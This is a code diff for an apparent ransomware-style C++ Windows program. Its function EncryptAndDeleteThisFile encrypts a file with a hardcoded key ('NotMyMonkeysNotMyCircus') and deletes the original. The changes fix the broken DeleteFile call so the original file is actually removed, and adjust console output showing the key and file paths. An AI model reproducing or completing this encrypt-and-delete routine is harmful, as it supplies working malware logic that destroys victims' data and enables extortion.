@@ -56,11 +56,11 @@ bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string k
 	LPCWSTR outputFile = std::wstring(fileEncrypted.begin(), fileEncrypted.end()).c_str();
 
 	//std::cout << "-------------------------" << std::endl;
-	std::wcout << "Key (default): " << keyDefault << std::endl;
-	std::cout << "Key (string):  " << keyString << std::endl;
-	std::cout << "Key length:    " << keyLength << std::endl;
-	std::cout << "Input file:    " << fileToEncrypt.c_str() << std::endl;
-	std::cout << "Output file:   " << fileEncrypted.c_str() << std::endl;
+	std::wcout << "Key:         " << keyDefault << std::endl;
+	std::cout << "Key (addr):  " << keyString << std::endl;
+	std::cout << "Key length:  " << keyLength << std::endl;
+	std::cout << "Input file:  " << fileToEncrypt.c_str() << std::endl;
+	std::cout << "Output file: " << fileEncrypted.c_str() << std::endl;
 	//std::cout << "-------------------------" << std::endl;
 
 
@@ -175,8 +175,6 @@ bool Cryptor(std::string fileToEncrypt, std::string fileEncrypted, std::string k
 	CloseHandle(hInputFile);
 	CloseHandle(hOutputFile);
 
-	//Sleep(5000);
-
 	return true;
 }
 
@@ -193,13 +191,8 @@ bool EncryptAndDeleteThisFile(std::string path)
 	fEncrypted = Cryptor(path, pathEncrypted, "NotMyMonkeysNotMyCircus");
 
 	std::cout << "Encrypt result: " << fEncrypted << std::endl;
-	std::cout << std::endl;
 	
-
-	//
-	// TODO: Fix DeleteFile processing
-	//
-	fDeleted = DeleteFile((LPCWSTR)path.c_str());
+	fDeleted = DeleteFile(std::wstring(path.begin(), path.end()).c_str());
 	if (!fDeleted)
 	{
 		DWORD dwStatus;
@@ -208,7 +201,7 @@ bool EncryptAndDeleteThisFile(std::string path)
 	}
 	else
 	{
-		std::cout << "Delete result: " << fDeleted << std::endl;
+		std::cout << "Delete result:  " << fDeleted << std::endl;
 	}
 
 	std::cout << std::endl;
